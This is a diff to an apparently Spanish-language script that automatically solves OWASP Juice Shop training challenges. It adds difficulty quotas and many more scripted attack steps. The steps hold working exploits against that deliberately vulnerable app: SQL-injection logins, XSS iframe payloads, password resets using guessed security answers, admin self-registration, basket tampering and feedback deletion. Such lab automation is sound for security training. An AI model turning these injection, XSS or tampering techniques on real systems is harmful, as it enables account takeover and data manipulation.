@@ -35,7 +35,7 @@ class JuiceClient {
   async challenges() {
     const r = await this.request('/api/Challenges')
     const rows = Array.isArray(r.json?.data) ? r.json.data : Array.isArray(r.json) ? r.json : null
-    if (r.status !== 200 || !rows || !rows.length || !rows.every(x => typeof x.key === 'string' && typeof x.solved === 'boolean')) {
+    if (r.status !== 200 || !rows || !rows.length || !rows.every(x => typeof x.key === 'string' && typeof x.solved === 'boolean' && Number.isInteger(x.difficulty) && x.difficulty >= 1 && x.difficulty <= 6)) {
       throw new Error('El destino no respondió como OWASP Juice Shop (/api/Challenges)')
     }
     return rows
@@ -81,6 +81,11 @@ async function upload(c, name, size) {
   return c.request('/file-upload', 'POST', form)
 }
 
+async function resetPassword(c, email, answer) {
+  const password = `Solver-${Date.now()}-Strong!`
+  return c.request('/rest/user/reset-password', 'POST', { email, answer, new: password, repeat: password })
+}
+
 const steps = [
   ['directoryListingChallenge', 'Documento confidencial', c => c.request('/ftp/acquisitions.md')],
   ['errorHandlingChallenge', 'Manejo de errores', c => c.request('/rest/qwertz')],
@@ -97,8 +102,14 @@ const steps = [
   ['registerAdminChallenge', 'Registro de admin', c => c.request('/api/Users', 'POST', { email: `solver-${Date.now()}@example.test`, password: 'JuiceShop123!', role: 'admin' })],
   ['loginAdminChallenge', 'Acceso de admin por SQLi', c => c.login("admin@juice-sh.op'--", 'x')],
   ['weakPasswordChallenge', 'Credenciales de admin', c => c.login('admin@juice-sh.op', 'admin123')],
+  ['exposedCredentialsChallenge', 'Credenciales de prueba expuestas', c => c.login('testing@juice-sh.op', 'IamUsedForTesting')],
   ['loginBenderChallenge', 'Acceso de Bender', c => c.login("bender@juice-sh.op'--", 'x')],
   ['changePasswordBenderChallenge', 'Contraseña de Bender', async c => { await c.login("bender@juice-sh.op'--", 'x'); await c.request('/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic') }],
+  ['resetPasswordBjoernOwaspChallenge', 'Mascota de Bjoern', c => resetPassword(c, 'bjoern@owasp.org', 'Zaya')],
+  ['resetPasswordJimChallenge', 'Pregunta de Jim', c => resetPassword(c, 'jim@juice-sh.op', 'Samuel')],
+  ['resetPasswordBenderChallenge', 'Pregunta de Bender', c => resetPassword(c, 'bender@juice-sh.op', "Stop'n'Drop")],
+  ['geoStalkingMetaChallenge', 'Ubicación de John', c => resetPassword(c, 'john@juice-sh.op', 'Daniel Boone National Forest')],
+  ['geoStalkingVisualChallenge', 'Ubicación de Emma', c => resetPassword(c, 'emma@juice-sh.op', 'ITsec')],
   ['loginJimChallenge', 'Acceso de Jim', c => c.login("jim@juice-sh.op'--", 'x')],
   ['ghostLoginChallenge', 'Acceso de Chris', c => c.login("chris.pike@juice-sh.op'--", 'x')],
   ['loginAmyChallenge', 'Acceso de Amy', c => c.login('amy@juice-sh.op', 'K1f.....................')],
@@ -123,7 +134,12 @@ const steps = [
   ['uploadSizeChallenge', 'Archivo grande', c => upload(c, 'large.pdf', 120000)],
   ['uploadTypeChallenge', 'Archivo no permitido', c => upload(c, 'sample.txt', 1024)],
   ['scoreBoardChallenge', 'Score Board', c => c.browse('score-board')],
-  ['privacyPolicyChallenge', 'Política de privacidad', c => c.browse('privacy-security/privacy-policy')],
+  ['privacyPolicyChallenge', 'Política de privacidad', async c => { await c.login('admin@juice-sh.op', 'admin123'); await c.browse('privacy-security/privacy-policy') }],
+  ['privacyPolicyProofChallenge', 'Inspección de privacidad', c => c.request('/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility')],
+  ['changeProductChallenge', 'Enlace de O-Saft', async c => { await c.login('admin@juice-sh.op', 'admin123'); await c.request('/api/Products/9', 'PUT', { description: '<a href="https://owasp.slack.com" target="_blank">More...</a>' }) }],
+  ['freeDeluxeChallenge', 'Membresía Deluxe', async c => { await c.login('admin@juice-sh.op', 'admin123'); await c.request('/rest/deluxe-membership', 'POST', { paymentMode: '' }) }],
+  ['feedbackChallenge', 'Comentarios de cinco estrellas', async c => { await c.login('admin@juice-sh.op', 'admin123'); const r = await c.request('/api/Feedbacks'); for (const row of r.json?.data || []) if (row.rating === 5) await c.request(`/api/Feedbacks/${row.id}`, 'DELETE') }],
+  ['basketManipulateChallenge', 'Producto en cesta ajena', async c => { const login = await c.login('admin@juice-sh.op', 'admin123'); const own = Number(login.json?.authentication?.bid); if (!own) throw new Error('No se pudo obtener BasketId'); const other = own === 1 ? 2 : 1; const body = `{"ProductId":14,"BasketId":"${own}","quantity":1,"BasketId":"${other}"}`; await c.request('/api/BasketItems', 'POST', body, { 'Content-Type': 'application/json' }) }],
   ['web3SandboxChallenge', 'Sandbox Web3', c => c.browse('web3-sandbox')],
   ['localXssChallenge', 'DOM XSS', async c => { const p = await c.browse('search'); await p.goto(`${c.origin}/#/search?q=${encodeURIComponent('<iframe src="javascript:alert(`xss`)">')}`); await delay(1800) }],
   ['xssBonusChallenge', 'Payload extra', async c => { const p = await c.browse('search'); const value = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'; await p.goto(`${c.origin}/#/search?q=${encodeURIComponent(value)}`); await delay(1800) }],
@@ -131,35 +147,77 @@ const steps = [
   ['reflectedXssChallenge', 'XSS reflejado', async c => { const p = await c.browse('track-result'); await p.goto(`${c.origin}/#/track-result?id=${encodeURIComponent('<iframe src="javascript:alert(`xss`)">')}`); await delay(1800) }],
   ['adminSectionChallenge', 'Sección admin', async c => { await c.login('admin@juice-sh.op', 'admin123'); await c.browse('administration') }],
   ['passwordHashLeakChallenge', 'Hash de contraseña', c => c.request('/rest/user/whoami')],
-  ['basketAccessChallenge', 'Cesta ajena', async c => { const p = await c.browse('basket'); await p.evaluate(() => sessionStorage.setItem('bid', '1')); await p.reload(); await delay(1500) }],
+  ['basketAccessChallenge', 'Cesta ajena', async c => { const login = await c.login('admin@juice-sh.op', 'admin123'); const own = Number(login.json?.authentication?.bid || 1); const other = own === 1 ? 2 : 1; const p = await c.browse('basket'); await p.evaluate(id => sessionStorage.setItem('bid', String(id)), other); await p.reload(); await delay(1500) }],
   ['forgedReviewChallenge', 'Reseña falsificada', c => c.request('/rest/products/1/reviews', 'PUT', { message: 'Automated review', author: 'admin@juice-sh.op' })]
 ]
 
-export async function runSolver(origin, requested, onUpdate = () => {}) {
+const levels = [1, 2, 3, 4, 5, 6]
+
+export function validateQuotas(value) {
+  if (!value || typeof value !== 'object' || Array.isArray(value)) throw new Error('Indica la cantidad por nivel')
+  const quotas = {}
+  for (const level of levels) {
+    const amount = value[level]
+    if (!Number.isInteger(amount) || amount < 0 || amount > (level === 3 ? 8 : 40)) throw new Error(`Cantidad inválida para nivel ${level}`)
+    quotas[level] = amount
+  }
+  const total = Object.values(quotas).reduce((sum, n) => sum + n, 0)
+  if (total < 1 || total > 40) throw new Error('El total debe estar entre 1 y 40')
+  return quotas
+}
+
+function counts(rows, predicate) {
+  return Object.fromEntries(levels.map(level => [level, rows.filter(row => row.difficulty === level && predicate(row)).length]))
+}
+
+export async function inspectTarget(origin) {
+  const client = new JuiceClient(origin)
+  const rows = await client.challenges()
+  const keys = new Set(steps.map(([key]) => key))
+  return {
+    target: origin,
+    total: counts(rows, () => true),
+    solved: counts(rows, row => row.solved),
+    remaining: counts(rows, row => !row.solved && !row.disabledEnv),
+    supported: counts(rows, row => !row.solved && !row.disabledEnv && keys.has(row.key))
+  }
+}
+
+export async function runSolver(origin, requestedQuotas, onUpdate = () => {}) {
+  const quotas = validateQuotas(requestedQuotas)
   const c = new JuiceClient(origin)
-  const report = { target: origin, requested, initialSolved: 0, newSolved: 0, solved: [], attempts: [], status: 'running' }
+  const report = { target: origin, quotas, requested: Object.values(quotas).reduce((sum, n) => sum + n, 0), initialSolved: 0, initialByLevel: {}, achieved: {}, supported: {}, newSolved: 0, extraSolved: 0, solved: [], attempts: [], status: 'running' }
   try {
     let before = await c.challenges()
     report.initialSolved = before.filter(x => x.solved).length
+    report.initialByLevel = counts(before, row => row.solved)
+    const keys = new Set(steps.map(([key]) => key))
+    report.supported = counts(before, row => !row.solved && !row.disabledEnv && keys.has(row.key))
+    report.achieved = Object.fromEntries(levels.map(level => [level, 0]))
     const initial = new Set(before.filter(x => x.solved).map(x => x.key))
     onUpdate(report)
-    for (const [key, label, action] of steps) {
-      if (report.newSolved >= requested) break
+    const ordered = [...steps].sort((a, b) => (before.find(x => x.key === a[0])?.difficulty || 7) - (before.find(x => x.key === b[0])?.difficulty || 7))
+    for (const [key, label, action] of ordered) {
+      if (levels.every(level => report.achieved[level] >= quotas[level])) break
       const challenge = before.find(x => x.key === key)
       if (!challenge || challenge.solved || challenge.disabledEnv) continue
-      const attempt = { key, label, status: 'pending' }
+      if (report.achieved[challenge.difficulty] >= quotas[challenge.difficulty]) continue
+      const attempt = { key, label, difficulty: challenge.difficulty, status: 'pending' }
       report.attempts.push(attempt)
       try { await action(c) } catch (e) { attempt.error = String(e.message || e).slice(0, 180) }
       await delay(300)
       try {
         before = await c.challenges()
-        report.solved = before.filter(x => x.solved && !initial.has(x.key)).map(x => ({ key: x.key, name: x.name }))
+        report.solved = before.filter(x => x.solved && !initial.has(x.key)).map(x => ({ key: x.key, name: x.name, difficulty: x.difficulty }))
         report.newSolved = report.solved.length
+        const byLevel = counts(report.solved, () => true)
+        report.achieved = Object.fromEntries(levels.map(level => [level, Math.min(byLevel[level], quotas[level])]))
+        report.extraSolved = report.newSolved - Object.values(report.achieved).reduce((sum, n) => sum + n, 0)
         attempt.status = before.some(x => x.key === key && x.solved) ? 'solved' : 'not_solved'
       } catch (e) { attempt.status = 'unverified'; attempt.error = String(e.message || e).slice(0, 180) }
       onUpdate(report)
     }
-    report.status = report.newSolved >= requested ? 'completed' : 'partial'
+    report.status = levels.every(level => report.achieved[level] >= quotas[level]) ? 'completed' : 'partial'
   } catch (e) { report.status = 'failed'; report.error = String(e.message || e).slice(0, 180) }
   finally { await c.close(); onUpdate(report) }
   return report
